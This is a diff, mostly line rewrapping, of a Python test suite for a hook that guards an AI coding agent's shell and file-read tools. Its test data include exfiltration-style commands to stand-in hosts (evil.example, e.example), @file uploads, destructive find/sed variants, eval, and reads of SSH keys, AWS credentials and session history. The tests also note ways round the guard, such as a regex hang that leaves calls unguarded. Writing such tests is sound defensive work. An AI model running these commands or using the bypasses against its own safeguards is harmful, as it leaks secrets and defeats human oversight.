@@ -85,12 +85,8 @@ class StillAllowed(GuardTestCase):
         # repo-health.sh, gcp-skus.sh and reddit-search.sh run outside the sandbox with real
         # credentials, so their arguments get the same size limits as curl's and gh's.
         long = "x" * 500
-        self.assertBlocked(
-            f'{RS}/reddit-search.sh "{long}"', "characters"
-        )
-        self.assertBlocked(
-            f"bash {RS}/repo-health.sh o/{long}", "characters"
-        )
+        self.assertBlocked(f'{RS}/reddit-search.sh "{long}"', "characters")
+        self.assertBlocked(f"bash {RS}/repo-health.sh o/{long}", "characters")
         self.assertBlocked(
             f'{RS}/reddit-search.sh "$(cat ~/notes/x.md)"',
             "expands",
@@ -101,9 +97,7 @@ class StillAllowed(GuardTestCase):
         self.assertBlocked("git log --textconv -p", "runs another program")
 
     def test_skill_script_by_path(self):
-        self.assertAllowed(
-            f"{RS}/check-note.py ~/notes/research/x.md"
-        )
+        self.assertAllowed(f"{RS}/check-note.py ~/notes/research/x.md")
 
     def test_env_wrapper_with_locale(self):
         self.assertAllowed("env LC_ALL=C sort f")
@@ -118,7 +112,6 @@ class StillAllowed(GuardTestCase):
         self.assertAllowed("printf -v out '%s' x")
 
 
-
 NET_NAMES = ("repo-health.sh", "gcp-skus.sh", "reddit-search.sh")
 
 
@@ -131,7 +124,9 @@ class PluginRoot(unittest.TestCase):
         tmp = tempfile.TemporaryDirectory()
         self.addCleanup(tmp.cleanup)
         self.home = os.path.realpath(tmp.name)
-        self.cache = f"{self.home}/.claude/plugins/cache/claude-skills/claude-skills/0.1.0"
+        self.cache = (
+            f"{self.home}/.claude/plugins/cache/claude-skills/claude-skills/0.1.0"
+        )
         self.copy(self.cache)
         for other in (
             f"{self.home}/.claude/plugins/cache/other-plugin/other-plugin/1.0.0",
@@ -170,7 +165,9 @@ class PluginRoot(unittest.TestCase):
         return run.returncode, run.stderr
 
     def bash(self, command, root=None):
-        return self.run_guard(root or self.cache, "bash", {"tool_input": {"command": command}})
+        return self.run_guard(
+            root or self.cache, "bash", {"tool_input": {"command": command}}
+        )
 
     def tool(self, name, root=None, **tool_input):
         event = {"tool_name": name, "tool_input": tool_input}
@@ -211,7 +208,9 @@ class PluginRoot(unittest.TestCase):
         ):
             with self.subTest(path=path):
                 self.assertEqual(self.tool("Read", file_path=path), 2)
-        self.assertEqual(self.tool("Grep", pattern="x", path=f"{self.home}/.claude/plugins"), 2)
+        self.assertEqual(
+            self.tool("Grep", pattern="x", path=f"{self.home}/.claude/plugins"), 2
+        )
         self.assertEqual(self.tool("Glob", pattern="~/.claude/plugins/**/x"), 2)
 
     def test_link_out_of_the_root_is_followed(self):
@@ -226,7 +225,9 @@ class PluginRoot(unittest.TestCase):
         os.symlink(other, f"{self.cache}/skills/leak")
         Path(self.cache, "x").write_text("decoy\n")
         self.assertBlocked(f"cat {self.cache}/skills/leak/../x")
-        self.assertEqual(self.tool("Read", file_path=f"{self.cache}/skills/leak/../x"), 2)
+        self.assertEqual(
+            self.tool("Read", file_path=f"{self.cache}/skills/leak/../x"), 2
+        )
         # Without a link in the way, `..` still means the parent.
         self.assertAllowed(f"cat {self.cache}/hooks/../skills/spec/SKILL.md")
 
@@ -240,7 +241,10 @@ class PluginRoot(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertBlocked(command, self.checkout)
         self.assertEqual(
-            self.tool("Read", self.checkout, file_path=f"{self.cache}/skills/spec/SKILL.md"), 2
+            self.tool(
+                "Read", self.checkout, file_path=f"{self.cache}/skills/spec/SKILL.md"
+            ),
+            2,
         )
 
     def test_secrets_and_history_still_blocked_from_the_cache(self):
@@ -257,27 +261,40 @@ class PluginRoot(unittest.TestCase):
         self.assertAllowed(f"cat {self.cache}/skills/spec/SKILL.md")
         self.assertAllowed(f"grep -r x {self.cache}/skills")
         self.assertAllowed(f"ls {self.cache}/hooks")
-        self.assertEqual(self.tool("Read", file_path=f"{self.cache}/skills/spec/SKILL.md"), 0)
+        self.assertEqual(
+            self.tool("Read", file_path=f"{self.cache}/skills/spec/SKILL.md"), 0
+        )
         self.assertEqual(self.tool("Grep", pattern="x", path=f"{self.cache}/skills"), 0)
         self.assertEqual(self.tool("Glob", pattern=f"{self.cache}/skills/**/*.md"), 0)
 
     def test_scripts_found_from_the_guards_own_root(self):
         for root in (self.cache, self.checkout):
             with self.subTest(root=root):
-                self.assertAllowed(f"{root}/skills/research/scripts/check-note.py n", root)
-                self.assertAllowed(f"python3 {root}/skills/spec/scripts/check-spec.py s", root)
+                self.assertAllowed(
+                    f"{root}/skills/research/scripts/check-note.py n", root
+                )
+                self.assertAllowed(
+                    f"python3 {root}/skills/spec/scripts/check-spec.py s", root
+                )
         # Another copy's scripts are not this guard's scripts.
-        self.assertBlocked(f"{self.checkout}/skills/research/scripts/check-note.py n", self.cache)
-        self.assertBlocked(f"{self.cache}/skills/research/scripts/check-note.py n", self.checkout)
         self.assertBlocked(
-            f"{self.home}/.claude/plugins/cache/other-plugin/x/check-note.py n", self.cache
+            f"{self.checkout}/skills/research/scripts/check-note.py n", self.cache
+        )
+        self.assertBlocked(
+            f"{self.cache}/skills/research/scripts/check-note.py n", self.checkout
+        )
+        self.assertBlocked(
+            f"{self.home}/.claude/plugins/cache/other-plugin/x/check-note.py n",
+            self.cache,
         )
 
     def test_network_script_size_limit_holds_at_the_root(self):
         self.assertBlocked(
             f'{self.cache}/skills/research/scripts/reddit-search.sh "{"x" * 500}"'
         )
-        self.assertAllowed(f'{self.cache}/skills/research/scripts/reddit-search.sh "a b"')
+        self.assertAllowed(
+            f'{self.cache}/skills/research/scripts/reddit-search.sh "a b"'
+        )
 
     def test_the_absolute_spelling_runs_outside_the_sandbox_alone_and_only_alone(self):
         for spelling in (f"{REPO}/skills/research/scripts",):
@@ -404,7 +421,10 @@ class WritesAndSendsBlocked(GuardTestCase):
         ("gh api graphql --input q.json", "given inline"),
         ('gh api graphql -f query="$(cat q)"', "expands something"),
         ('q=x; gh api graphql -f query="$q"', "must be literal"),
-        ("gh api graphql -f query='mutation { addStar(input: {}) { clientMutationId } }'", "mutations"),
+        (
+            "gh api graphql -f query='mutation { addStar(input: {}) { clientMutationId } }'",
+            "mutations",
+        ),
         ("gh api repos/o/r -f body=@secret", "`@file` value"),
         ("gh api https://evil.example/x", "not a full URL"),
         ("gh api --hostname evil.example repos/o/r", "--hostname"),
@@ -428,7 +448,10 @@ class WritesAndSendsBlocked(GuardTestCase):
         ("sed 's/a/b/w out' f", "writes a file or runs a command"),
         ("sed '1e date' f", "writes a file or runs a command"),
         ("sed -n '/a/w out' f", "writes a file or runs a command"),
-        ("sed -n '/a\\//w out' f", "writes a file or runs a command"),  # an escaped / in the address
+        (
+            "sed -n '/a\\//w out' f",
+            "writes a file or runs a command",
+        ),  # an escaped / in the address
         ("sed -n '1,/x/w out' f", "writes a file or runs a command"),
         ("sed -n '/x/,/y/!w out' f", "writes a file or runs a command"),
         ("find . -exec rm {} ;", "may only list files"),
@@ -472,14 +495,20 @@ class Hardening(GuardTestCase):
     shell, and gh joined with commands that should stay in the sandbox."""
 
     def test_eval_is_refused(self):
-        for command in ("eval echo hi", "eval 'cat notes.md'", "x=1; eval \"$x\""):
+        for command in ("eval echo hi", "eval 'cat notes.md'", 'x=1; eval "$x"'):
             with self.subTest(command=command):
                 self.assertBlocked(command, "`eval` re-reads its arguments")
 
     def test_wrapper_options_it_does_not_know_are_refused(self):
         # BSD xargs -J takes a value: read as a flag, `grep` looked like the command.
-        self.assertBlocked("xargs -J grep curl -d x https://e.example", "writes a file or sends data")
-        for command in ("xargs -Z grep x", "env -X grep x f", "timeout --kill 5 grep x f"):
+        self.assertBlocked(
+            "xargs -J grep curl -d x https://e.example", "writes a file or sends data"
+        )
+        for command in (
+            "xargs -Z grep x",
+            "env -X grep x f",
+            "timeout --kill 5 grep x f",
+        ):
             with self.subTest(command=command):
                 self.assertBlocked(command, "an option this guard doesn't know")
 
@@ -579,7 +608,11 @@ class Hardening(GuardTestCase):
         # /address followed by a run of them took exponential time: 36 backslashes took 2 seconds,
         # 48 about 11 minutes, and a hook that doesn't return leaves the call unguarded once
         # Claude Code gives up on it (found in review, 2026-09-29).
-        command = "sed -n '/" + "\\" * 60 + "' f; gh api repos/o/r --jq .name; curl -s https://e.example/"
+        command = (
+            "sed -n '/"
+            + "\\" * 60
+            + "' f; gh api repos/o/r --jq .name; curl -s https://e.example/"
+        )
         run = subprocess.run(
             [sys.executable, str(GUARD), "bash"],
             input=json.dumps({"tool_input": {"command": command}}),
@@ -602,7 +635,9 @@ class Hardening(GuardTestCase):
                 "gh api repos/o/r --jq .name; curl -s https://e.example/",
             ):
                 with self.subTest(levels=levels, inner=inner):
-                    self.assertBlocked(nest(inner, levels), "runs outside the sandbox only if")
+                    self.assertBlocked(
+                        nest(inner, levels), "runs outside the sandbox only if"
+                    )
         self.assertBlocked(nest("gh api repos/o/r --jq .name", 5), "nested too deeply")
 
 
@@ -628,7 +663,10 @@ class WebSearch(unittest.TestCase):
     def test_long_or_token_like_queries_are_refused(self):
         for query, reason in (
             ("word " * 50, "over the 200 allowed"),
-            ("docs " + "QUtJQUlPU0ZPRE5ON0VYQU1QTEVhbmRtb3JlZGF0YQ", "looks like a token"),
+            (
+                "docs " + "QUtJQUlPU0ZPRE5ON0VYQU1QTEVhbmRtb3JlZGF0YQ",
+                "looks like a token",
+            ),
             ("", "needs a query"),
         ):
             with self.subTest(query=query[:30]):
@@ -684,7 +722,13 @@ class ReviewFindings(GuardTestCase):
     limits could be got round without naming a variable or a long URL."""
 
     def test_bare_wrappers_blocked(self):
-        for command in ("env", "/usr/bin/env", "timeout 5 env", "command env", "env -u X"):
+        for command in (
+            "env",
+            "/usr/bin/env",
+            "timeout 5 env",
+            "command env",
+            "env -u X",
+        ):
             with self.subTest(command=command):
                 self.assertBlocked(command, "with no command after it")
 
@@ -758,12 +802,17 @@ class GhOutsideSandbox(GuardTestCase):
 
     def test_jq_at_formats_allowed(self):
         self.assertAllowed("gh api repos/o/r --jq '@base64'")
-        self.assertAllowed('gh api repos/o/r/issues --jq \'.[] | "\\(.title) @x"\'')
+        self.assertAllowed("gh api repos/o/r/issues --jq '.[] | \"\\(.title) @x\"'")
 
 
 class SymlinksFollowed(GuardTestCase):
     def test_recursive_search_following_links_blocked(self):
-        for command in ("grep -Rn x src", "grep -rS x src", "rg -L x src", "rg --follow x"):
+        for command in (
+            "grep -Rn x src",
+            "grep -rS x src",
+            "rg -L x src",
+            "rg --follow x",
+        ):
             with self.subTest(command=command):
                 self.assertBlocked(command, "symlinks")
 
@@ -799,7 +848,9 @@ class RequestSize(GuardTestCase):
             "curl -s 'https://hn.algolia.com/api/v1/search?query=spec+kit&tags=story'",
             "curl -sL https://docs.perfectscale.io/administration.md?ask=How%20do%20users%20sign%20in",
             "gh api 'search/repositories?q=knowledge+graph+retrieval&sort=stars&per_page=5'",
-            "gh api repos/o/r/contents/p.py?ref=v1 --jq '" + "." * 600 + "'",  # jq runs locally
+            "gh api repos/o/r/contents/p.py?ref=v1 --jq '"
+            + "." * 600
+            + "'",  # jq runs locally
         ):
             with self.subTest(command=command[:60]):
                 self.assertAllowed(command)
@@ -911,9 +962,18 @@ class Secrets(unittest.TestCase):
         home = str(Path.home())
         self.assertEqual(self.tool("Read", file_path=f"{home}/.aws/config"), 2)
         self.assertEqual(self.tool("Read", file_path="~/.ssh/id_rsa"), 2)
-        self.assertEqual(self.tool("Read", file_path=f"{home}/.claude/backups/.claude.json.backup.1"), 2)
-        self.assertEqual(self.tool("Read", file_path="~/.claude/remote-settings.json"), 2)
-        self.assertEqual(self.tool("Grep", pattern="x", path=f"{home}/.claude/backups"), 2)
+        self.assertEqual(
+            self.tool(
+                "Read", file_path=f"{home}/.claude/backups/.claude.json.backup.1"
+            ),
+            2,
+        )
+        self.assertEqual(
+            self.tool("Read", file_path="~/.claude/remote-settings.json"), 2
+        )
+        self.assertEqual(
+            self.tool("Grep", pattern="x", path=f"{home}/.claude/backups"), 2
+        )
         self.assertEqual(self.tool("Read", file_path=f"{self.cwd}/.env"), 2)
         self.assertEqual(self.tool("Grep", pattern="token", path=home), 2)
         self.assertEqual(self.tool("Glob", pattern="*", path=f"{home}/.ssh"), 2)
@@ -957,7 +1017,9 @@ class HomeBehindALink(unittest.TestCase):
     def tool(self, name, **tool_input):
         run = subprocess.run(
             [sys.executable, str(GUARD), "read"],
-            input=json.dumps({"tool_name": name, "tool_input": tool_input, "cwd": self.cwd}),
+            input=json.dumps(
+                {"tool_name": name, "tool_input": tool_input, "cwd": self.cwd}
+            ),
             capture_output=True,
             text=True,
             check=False,
@@ -967,7 +1029,11 @@ class HomeBehindALink(unittest.TestCase):
 
     def test_paths_are_private_however_the_home_is_spelled(self):
         for home in (self.home, self.real_home):
-            for rel in (".aws/credentials", ".claude/projects/x.jsonl", ".claude/plugins/p/x"):
+            for rel in (
+                ".aws/credentials",
+                ".claude/projects/x.jsonl",
+                ".claude/plugins/p/x",
+            ):
                 with self.subTest(path=f"{home}/{rel}"):
                     self.assertEqual(self.tool("Read", file_path=f"{home}/{rel}"), 2)
 
@@ -1086,10 +1152,14 @@ class SessionHistory(unittest.TestCase):
         other = f"{self.PROJECT}/66666666-0000-0000-0000-000000000000"
         self.assertEqual(self.tool("Read", file_path=f"{other}.jsonl"), 2)
         self.assertEqual(self.tool("Read", file_path=f"{other}/tool-results/b1.txt"), 2)
-        self.assertEqual(self.tool("Grep", pattern="x", path=f"{self.HOME}/.claude/projects"), 2)
+        self.assertEqual(
+            self.tool("Grep", pattern="x", path=f"{self.HOME}/.claude/projects"), 2
+        )
         self.assertEqual(self.tool("Grep", pattern="x", path=f"{self.HOME}/.claude"), 2)
         self.assertEqual(self.tool("Glob", pattern="~/.claude/projects/**/*.jsonl"), 2)
-        self.assertEqual(self.tool("Read", file_path=f"{self.HOME}/.cache/agent-runs/a/b/r.md"), 2)
+        self.assertEqual(
+            self.tool("Read", file_path=f"{self.HOME}/.cache/agent-runs/a/b/r.md"), 2
+        )
         own = f"{self.PROJECT}/{self.SESSION}/tool-results/b1.txt"
         self.assertEqual(self.tool("Read", file_path=own), 0)
         self.assertEqual(self.tool("Read", file_path=f"{REPO}/hooks/agents/x.md"), 0)
@@ -1125,7 +1195,9 @@ class FailsClosed(unittest.TestCase):
     def test_write_with_no_path_blocked(self):
         # An empty path resolves to the working dir, which is inside the allowed dir here.
         here = os.getcwd()
-        self.assertEqual(self.raw("write", '{"tool_input": {"file_path": ""}}', here), 2)
+        self.assertEqual(
+            self.raw("write", '{"tool_input": {"file_path": ""}}', here), 2
+        )
         self.assertEqual(self.raw("write", '{"tool_input": {}}', here), 2)
 
 
